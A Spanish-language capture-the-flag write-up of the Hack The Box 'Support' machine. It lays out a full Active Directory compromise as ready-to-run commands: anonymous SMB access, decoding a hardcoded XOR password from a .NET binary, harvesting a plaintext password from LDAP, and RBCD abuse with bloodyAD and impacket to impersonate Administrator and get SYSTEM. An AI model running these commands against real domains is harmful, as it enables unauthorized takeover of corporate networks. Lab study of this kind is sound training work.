[🎯 Support — HTB [Windows · Easy · AD] 36c15bd2d16c81038330ce7e58eb092f.md](https://github.com/user-attachments/files/28305341/Support.HTB.Windows.Easy.AD.36c15bd2d16c81038330ce7e58eb092f.md)
# 🎯 Support — HTB [Windows · Easy · AD]

| Campo | Detalle |
| --- | --- |
| IP | `10.129.230.181` |
| Dominio | `support.htb` |
| Vector inicial | SMB anónimo → UserInfo.exe → reversing XOR → credenciales ldap |
| Usuario inicial | `ldap` : `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz` |
| Foothold | `support` : `Ironside47pleasure40Watchful` (campo info en LDAP) |
| Escalada | RBCD — GenericAll sobre DC → fake machine → S4U2Proxy → impersonate Administrator |
| Root | `nt authority\system` vía impacket-psexec con ticket Kerberos |
| Metasploit | ❌ No usado |

---

# 1. Reconocimiento

## Nmap — puertos

Nmap rinde un mapa clásico de DC: DNS, Kerberos, RPC, SMB, LDAP, WinRM. Con 5985 abierto el objetivo ya está claro — si conseguimos credenciales válidas, tenemos shell con evil-winrm.

```bash
nmap -sS -p- --min-rate 5000 10.129.230.181
```

> 
> 
> 
> ![image.png](%F0%9F%8E%AF%20Support%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%20%C2%B7%20AD%5D/image.png)
> 

```bash
nmap -sV -sC -p 53,88,135,139,389,445,636,3268,5985 10.129.230.181
```

> 
> 
> 
> ![image.png](%F0%9F%8E%AF%20Support%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%20%C2%B7%20AD%5D/image%201.png)
> 

---

# 2. Enumeración SMB

Con SMB abierto lo primero es ver qué shares hay accesibles sin credenciales.

```bash
smbclient -L //10.129.230.181/ -N
```

> 
> 
> 
> ![image.png](%F0%9F%8E%AF%20Support%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%20%C2%B7%20AD%5D/image%202.png)
> 

```bash
smbclient //10.129.230.181/support-tools -N
smb: \> ls
```

> 
> 
> 
> ![image.png](%F0%9F%8E%AF%20Support%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%20%C2%B7%20AD%5D/image%203.png)
> 

El resto son herramientas conocidas con nombres estándar. `UserInfo.exe.zip` es la única con nombre propio del entorno — merece análisis.

---

# 3. Reversing UserInfo.exe

Descargamos el zip, extraemos el exe y lo analizamos con `monodis`, que convierte ensamblados .NET a IL (Intermediate Language) legible.

```bash
smb: \> get UserInfo.exe.zip
unzip UserInfo.exe.zip
monodis UserInfo.exe > codigo.txt
```

> 
> 
> 
> ![image.png](%F0%9F%8E%AF%20Support%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%20%C2%B7%20AD%5D/image%204.png)
> 

Luego filtramos los strings en texto claro del ensamblado — los `ldstr` son literales que el código carga en tiempo de ejecución.

```bash
grep "ldstr" codigo.txt
```

> 
> 
> 
> ![image.png](%F0%9F%8E%AF%20Support%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%20%C2%B7%20AD%5D/image%205.png)
> 

Tenemos una cadena en base64 y una clave `armando`. Ahora miramos cómo los usa el código:

> 
> 
> 
> ![image.png](%F0%9F%8E%AF%20Support%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%20%C2%B7%20AD%5D/image%206.png)
> 

El algoritmo es:

1. Decodificar la cadena de base64
2. XOR cada byte con la clave `armando` (byte a byte, ciclando)
3. XOR cada resultado con `0xDF` (223 en decimal)

Replicamos en CyberChef:

> 
> 
> 
> ![image.png](%F0%9F%8E%AF%20Support%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%20%C2%B7%20AD%5D/image%207.png)
> 

Contraseña obtenida. Combinada con el usuario `support\ldap` que aparecía en los strings.

## Validar credenciales

```bash
netexec ldap support.htb -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```

> 
> 
> 
> ![image.png](%F0%9F%8E%AF%20Support%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%20%C2%B7%20AD%5D/image%208.png)
> 

---

# 4. Enumeración LDAP con credenciales

Ahora con credenciales reales volcamos toda la estructura del AD.

```bash
ldapsearch -H ldap://support.htb -D "support\\ldap" \
  -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b "DC=support,DC=htb" > ldap.txt
```

Revisando el output, en el objeto del usuario `support` hay algo que no debería estar ahí — el campo `info` con texto en claro.

> 
> 
> 
> ![image.png](%F0%9F%8E%AF%20Support%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%20%C2%B7%20AD%5D/image%209.png)
> 

Contraseña en texto plano en el campo `info` de un usuario de AD. Alguien la puso ahí para "recordarla" y se olvidó de borrarla.

---

# 5. Acceso inicial — evil-winrm

```bash
evil-winrm -i 10.129.230.181 -u support -p 'Ironside47pleasure40Watchful'
```

> 
> 
> 
> ![image.png](%F0%9F%8E%AF%20Support%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%20%C2%B7%20AD%5D/image%2010.png)
> 

---

# 6. Escalada — RBCD (Resource-Based Constrained Delegation)

## BloodHound — mapear el dominio

Con acceso al sistema subimos SharpHound para mapear el AD y encontrar rutas de ataque.

```powershell
*Evil-WinRM* PS> upload SharpHound.exe
*Evil-WinRM* PS> .\SharpHound.exe
```

> 
> 
> 
> ![image.png](%F0%9F%8E%AF%20Support%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%20%C2%B7%20AD%5D/image%2011.png)
> 

Descargamos el zip generado y lo cargamos en BloodHound:

> 
> 
> 
> ![image.png](%F0%9F%8E%AF%20Support%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%20%C2%B7%20AD%5D/image%2012.png)
> 

El usuario `support` pertenece a un grupo que tiene **GenericAll** sobre el objeto del Domain Controller. Esto significa control total sobre ese objeto de computadora — y el vector de ataque es RBCD.

## ¿Por qué RBCD?

GenericAll sobre un objeto de computadora (especialmente el DC) permite escribir el atributo `msDS-AllowedToActOnBehalfOfOtherIdentity`. Esto configura delegación basada en recursos: le decimos al DC que confíe en una máquina que nosotros controlamos para impersonar usuarios.

Flujo:

1. Crear una fake machine account que controlemos
2. Configurar RBCD: el DC confía en nuestra fake machine
3. Usar S4U2Proxy para obtener un ticket de Administrator
4. Pass-the-Ticket para acceder como SYSTEM

## Paso 1 — Crear fake machine account

```bash
bloodyAD --host 10.129.230.181 -d support.htb \
  -u support -p 'Ironside47pleasure40Watchful' \
  add computer 'HACKER-PC' 'Password123!'
```

> 
> 
> 
> ![image.png](%F0%9F%8E%AF%20Support%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%20%C2%B7%20AD%5D/image%2013.png)
> 

## Paso 2 — Configurar RBCD

```bash
bloodyAD --host 10.129.230.181 -d support.htb \
  -u support -p 'Ironside47pleasure40Watchful' \
  add rbcd 'DC$' 'HACKER-PC$'
```

> 
> 
> 
> ![image.png](%F0%9F%8E%AF%20Support%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%20%C2%B7%20AD%5D/image%2014.png)
> 

## Paso 3 — Obtener ticket de Administrator con S4U

```bash
impacket-getST -dc-ip 10.129.230.181 \
  -spn 'cifs/DC.support.htb' \
  -impersonate Administrator \
  'support.htb/HACKER-PC$:Password123!'
```

> 
> 
> 
> ![image.png](%F0%9F%8E%AF%20Support%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%20%C2%B7%20AD%5D/image%2015.png)
> 

## Paso 4 — Exportar ticket y usar psexec

```bash
export KRB5CCNAME=Administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache
```

> 
> 
> 
> ![image.png](%F0%9F%8E%AF%20Support%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%20%C2%B7%20AD%5D/image%2016.png)
> 

```bash
impacket-psexec -k -no-pass 'support.htb/Administrator@DC.support.htb'
```

> 
> 
> 
> ![image.png](%F0%9F%8E%AF%20Support%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%20%C2%B7%20AD%5D/image%2017.png)
> 

> 
> 
> 
> ![image.png](%F0%9F%8E%AF%20Support%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%20%C2%B7%20AD%5D/image%2018.png)
> 

---

# 7. Cadena de ataque

```
SMB anónimo → share support-tools → UserInfo.exe.zip
    ↓
monodis + grep ldstr → base64 + clave XOR 'armando' + 0xDF
    ↓
CyberChef decode → ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
    ↓
ldapsearch autenticado → campo info del usuario support en texto plano
    ↓
evil-winrm → support:Ironside47pleasure40Watchful → user.txt
    ↓
SharpHound + BloodHound → GenericAll sobre DC
    ↓
bloodyAD add computer → HACKER-PC$ creada
bloodyAD add rbcd → DC confía en HACKER-PC$
    ↓
impacket-getST S4U2Proxy → ticket Administrator .ccache
    ↓
export KRB5CCNAME + impacket-psexec -k -no-pass → SYSTEM → root.txt
```

---

# 8. Moralejas

## Los binarios en shares SMB se analizan siempre

Un `.exe` con nombre propio del entorno en un share público es una señal de alerta. `monodis` convierte ensamblados .NET a IL legible en segundos. El patrón `grep ldstr` para extraer strings es reflejo automático — en .NET los literales del código quedan expuestos en el ensamblado compilado.

## El campo `info` de los usuarios de AD es un sitio típico de credenciales

Administradores que "guardan" contraseñas en campos de descripción o info de objetos AD es un hallazgo clásico. En un pentest real esto es crítico inmediato. El reflejo es revisar siempre los campos no estándar de los objetos de usuario en el ldapsearch: `info`, `description`, `comment`.

## GenericAll sobre un objeto de computadora = RBCD

Cuando BloodHound muestra GenericAll sobre el DC, el camino más directo suele ser RBCD si no puedes hacer DCSync directamente. El flujo es siempre el mismo: crear fake machine → configurar delegación → S4U2Proxy → ticket de Administrator. bloodyAD hace los dos primeros pasos en dos comandos.

## Kerberos siempre con FQDN, nunca con IP

impacket-psexec con `-k -no-pass` falla si usas la IP en vez del FQDN. Kerberos valida el nombre del servicio contra el ticket, y el ticket se generó para `cifs/DC.support.htb`, no para `cifs/10.129.230.181`. Siempre `/etc/hosts` actualizado y FQDN en los comandos de Kerberos.

## MAQ > 0 es el prerequisito silencioso del RBCD

Este ataque requiere que `ms-DS-MachineAccountQuota` sea mayor que 0 para poder crear la fake machine. Verificarlo siempre al inicio del AD: `netexec ldap IP -u user -p pass -M maq`. Si es 0, necesitas comprometer una machine account existente.

## El patrón OSCP de esta máquina

```
Share público → binario .NET → reversing de credenciales hardcodeadas
    ↓
LDAP autenticado → contraseña en campo no estándar
    ↓
BloodHound → ACL abuse (GenericAll) → RBCD → impersonation
```

Este tipo de cadena (credencial en binario → credencial en LDAP → ACL abuse) es exactamente el AD set del OSCP.

---

# 9. Conceptos técnicos clave

**RBCD (Resource-Based Constrained Delegation):** La delegación configurada en el recurso destino (no en el origen). Al tener GenericAll sobre el DC escribimos `msDS-AllowedToActOnBehalfOfOtherIdentity` para que el DC confíe en nuestra fake machine.

**S4U2Proxy:** Protocolo Kerberos que permite a un servicio obtener un ticket de servicio en nombre de otro usuario (impersonation). Requiere un TGT del servicio origen (nuestra fake machine) y produce un ST que representa al Administrator ante el DC.

**Pass-the-Ticket:** Usar el archivo `.ccache` directamente como autenticación Kerberos. `export KRB5CCNAME=archivo.ccache` le dice a impacket qué ticket usar sin necesitar contraseña.

**Clock Skew:** Kerberos falla si hay más de 5 minutos de diferencia entre tu máquina y el DC. `ntpdate IP` o `rdate -n IP` lo sincroniza.

---

# 10. Comandos clave

```bash
# SMB anónimo
smbclient -L //10.129.230.181/ -N
smbclient //10.129.230.181/support-tools -N

# Reversing .NET
monodis UserInfo.exe > codigo.txt
grep "ldstr" codigo.txt
# CyberChef: From Base64 > XOR armando UTF8 > XOR df HEX

# Validar credenciales ldap
netexec ldap support.htb -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'

# LDAP dump con credenciales
ldapsearch -H ldap://support.htb -D "support\\ldap" \
  -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b "DC=support,DC=htb" > ldap.txt
grep -i "info\|description\|comment" ldap.txt

# Evil-WinRM
evil-winrm -i 10.129.230.181 -u support -p 'Ironside47pleasure40Watchful'

# BloodHound
# upload SharpHound.exe desde evil-winrm
# .\SharpHound.exe
# download archivo.zip

# RBCD — crear fake machine
bloodyAD --host 10.129.230.181 -d support.htb \
  -u support -p 'Ironside47pleasure40Watchful' \
  add computer 'HACKER-PC' 'Password123!'

# RBCD — configurar delegación
bloodyAD --host 10.129.230.181 -d support.htb \
  -u support -p 'Ironside47pleasure40Watchful' \
  add rbcd 'DC$' 'HACKER-PC$'

# S4U2Proxy — obtener ticket Administrator
impacket-getST -dc-ip 10.129.230.181 \
  -spn 'cifs/DC.support.htb' \
  -impersonate Administrator \
  'support.htb/HACKER-PC$:Password123!'

# Pass-the-Ticket
export KRB5CCNAME=Administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache
impacket-psexec -k -no-pass 'support.htb/Administrator@DC.support.htb'
```
